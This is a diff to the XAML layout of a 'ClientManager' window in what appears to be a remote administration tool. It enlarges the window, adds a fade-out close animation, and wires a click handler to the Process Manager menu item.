@@ -12,7 +12,18 @@
         xmlns:behave="clr-namespace:Axeno.Interaction.Behaviours"
         xmlns:local="clr-namespace:Axeno.Views.Windows"
         mc:Ignorable="d"
-        Title="ClientManager" Height="520" Width="900" MinWidth="900" MinHeight="520">
+        Title="ClientManager" Height="585" Width="1040" MinWidth="900" MinHeight="520">
+    <Window.Resources>
+        <Storyboard x:Key="ExitAnimation">
+            <DoubleAnimation Storyboard.Target="{Binding ElementName='window'}"
+                             Storyboard.TargetProperty="(Window.Opacity)"
+                             Duration="0:0:1" From="1" To="0"/>
+        </Storyboard>
+    </Window.Resources>
+
+    <i:Interaction.Behaviors>
+        <behave:CloseBehavior Storyboard="{StaticResource ExitAnimation}"/>
+    </i:Interaction.Behaviors>
     <Grid>
         <Border CornerRadius="25" BorderBrush="DarkGray" BorderThickness="0" Padding="6" Background="White" MouseDown="Border_MouseDown">
             <Grid Name="grddevmgr">
@@ -31,7 +42,7 @@
                     <MenuItem Header="System" >
                         <MenuItem Header="File Explorer" Name="filexplorer" Click="filexplorer_Click"/>
                         <MenuItem Header="Registry Editor" />
-                        <MenuItem Header="Process Manager" />
+                        <MenuItem Header="Process Manager" Name="procmgr" Click="procmgr_Click" />
                         <MenuItem Header="Command Line" />
                     </MenuItem>
                     <MenuItem Header="Surveillance" >
